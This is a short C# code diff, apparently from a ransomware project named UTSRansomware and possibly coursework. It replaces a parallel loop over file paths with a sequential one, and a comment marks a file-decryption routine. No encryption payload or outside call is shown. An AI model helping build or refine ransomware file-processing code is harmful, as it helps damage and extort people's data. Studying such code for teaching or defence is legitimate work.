@@ -69,7 +69,7 @@ namespace UTSRansomware
 
             // Using multi threaded processing to try improve speed
             // Don't think this is working properly so will have to fix
-            Parallel.ForEach(filePaths, (filePath) =>
+            foreach (string filePath in filePaths)
             {
                 string fileExtension = Path.GetExtension(filePath);
                 if (!string.IsNullOrEmpty(fileExtension))
@@ -89,7 +89,7 @@ namespace UTSRansomware
                         Console.WriteLine(ex.ToString());
                     }
                 }
-        });
+            }
         }
 
         // Decrypts a given file
